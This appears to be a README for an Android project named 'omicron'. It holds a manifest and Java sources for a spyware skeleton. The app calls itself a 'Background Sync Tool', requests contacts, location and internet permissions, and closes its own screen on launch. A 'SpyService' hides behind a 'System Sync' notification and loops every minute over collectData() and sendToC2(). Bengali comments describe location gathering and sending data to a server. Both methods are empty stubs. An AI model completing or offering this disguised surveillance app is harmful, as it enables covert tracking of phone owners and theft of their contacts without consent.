# omicron
![omicron](20260602_202149.png)
---
## AndroidManifest.xml:

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.backgroundapp">

    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.INTERNET"/> 

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="Background Sync Tool"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
        
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        
        <service android:name=".SpyService"
            android:enabled="true"
            android:exported="false" />
    </application>
</manifest>
```
## MainActivity.java:
```
package com.example.backgroundapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // ব্যাকগ্রাউন্ড সার্ভিস চালু করার কোড
        Intent serviceIntent = new Intent(this, SpyService.class);
        ContextCompat.startForegroundService(this, serviceIntent);
        
        // সার্ভিস চালু করে অ্যাপের স্ক্রিন বন্ধ করে দেওয়া
        finish();
    }
}

```

## SpyService.java:

```
package com.example.backgroundapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

public class SpyService extends Service {
    private boolean isRunning = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // নোটিফিকেশন চ্যানেল তৈরি (Android 8.0+ এর জন্য বাধ্যতামুলক)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "sync_channel", "Data Sync Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        // ফোরগ্রাউন্ড নোটিফিকেশন (সিস্টেম ক্র্যাশ এড়াতে আইকন ও টেক্সট যুক্ত করা হয়েছে)
        Notification notification = new NotificationCompat.Builder(this, "sync_channel")
                .setContentTitle("System Sync")
                .setContentText("Running background tasks...")
                .setSmallIcon(android.R.drawable.ic_popup_sync) // ভ্যালিড সিস্টেম আইকন
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();

        // ফোরগ্রাউন্ড সার্ভিস হিসেবে রান করা
        startForeground(101, notification);

        // ব্যাকগ্রাউন্ড প্রসেস চালু করা (একটানা ১ মিনিট পর পর রান হবে)
        if (!isRunning) {
            isRunning = true;
            new Thread(() -> {
                while (isRunning) {
                    try {
                        collectData();
                        sendToC2();
                        Thread.sleep(60000); // ৬০ সেকেন্ড অপেক্ষা
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                    }
                }
            }).start();
        }

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void collectData() {
        // এখানে ডেটা কালেকশনের লজিক থাকবে (যেমন: লোকেশন চেক করা)
    }

    private void sendToC2() {
        // এখানে সার্ভারে ডেটা পাঠানোর নেটওয়ার্ক কোড থাকবে
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }
}
```


## Build Instructions:
File -> New -> New Project -> Empty Activity


Powered by Omi
